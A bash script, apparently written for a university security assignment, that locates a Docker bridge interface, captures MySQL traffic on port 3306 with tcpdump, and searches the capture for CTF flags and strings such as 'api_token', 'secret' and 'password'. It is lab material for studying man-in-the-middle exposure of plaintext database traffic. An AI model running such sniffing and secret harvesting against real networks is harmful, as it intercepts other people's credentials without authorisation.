#!/bin/bash
# Manual MITM capture - simpler approach

echo "=========================================="
echo "Manual MITM Traffic Capture"
echo "=========================================="
echo ""

# Step 1: Find bridge interface
echo "STEP 1: Finding Docker bridge interface..."
echo ""

# Try to find it automatically
NETWORK_NAME="csce413_assignment2_vulnerable_network"
BRIDGE_IF=$(docker network inspect $NETWORK_NAME 2>/dev/null | grep -oP '"Name": "\K[^"]+' | grep br- | head -1)

if [ -z "$BRIDGE_IF" ]; then
    # Try ip command
    BRIDGE_IF=$(ip link show 2>/dev/null | grep -oP 'br-[0-9a-f]+' | head -1)
fi

if [ -z "$BRIDGE_IF" ]; then
    # Try ifconfig (macOS)
    BRIDGE_IF=$(ifconfig 2>/dev/null | grep -E "^br-|^docker" | head -1 | cut -d: -f1)
fi

if [ -z "$BRIDGE_IF" ]; then
    echo "⚠️  Could not auto-detect bridge interface"
    echo ""
    echo "Available interfaces:"
    if command -v ip >/dev/null 2>&1; then
        ip link show | grep -E "^[0-9]+:" | awk '{print $2}' | tr -d ':'
    else
        ifconfig | grep -E "^[a-z]" | cut -d: -f1
    fi
    echo ""
    read -p "Enter bridge interface name: " BRIDGE_IF
fi

if [ -z "$BRIDGE_IF" ]; then
    echo "❌ No interface specified"
    exit 1
fi

echo "✅ Using interface: $BRIDGE_IF"
echo ""

# Step 2: Start capture
OUTPUT_FILE="mitm/mysql_traffic.pcap"
mkdir -p mitm

echo "STEP 2: Starting traffic capture..."
echo "   Interface: $BRIDGE_IF"
echo "   Output: $OUTPUT_FILE"
echo ""
echo "⚠️  NOW DO THIS IN ANOTHER TERMINAL/BROWSER:"
echo "   1. Open browser: http://localhost:5001"
echo "   2. Navigate through all pages"
echo "   3. Refresh multiple times"
echo "   4. Wait 10-20 seconds"
echo ""
echo "Then come back here and press Ctrl+C to stop"
echo ""
echo "Starting capture in 3 seconds..."
sleep 3

# Capture
sudo tcpdump -i "$BRIDGE_IF" -A -s 0 'port 3306' -w "$OUTPUT_FILE"

echo ""
echo "✅ Capture complete!"
echo ""

# Step 3: Analyze
if [ -f "$OUTPUT_FILE" ]; then
    echo "STEP 3: Analyzing captured traffic..."
    echo ""
    
    echo "Searching for flags..."
    tcpdump -r "$OUTPUT_FILE" -A 'port 3306' 2>/dev/null | grep -i "FLAG{" | head -5
    
    echo ""
    echo "📄 To view full capture:"
    echo "   tcpdump -r $OUTPUT_FILE -A 'port 3306' | less"
    echo ""
    echo "📄 To search for specific terms:"
    echo "   tcpdump -r $OUTPUT_FILE -A 'port 3306' | grep -i 'api_token\|secret\|password'"
else
    echo "❌ No capture file created"
fi

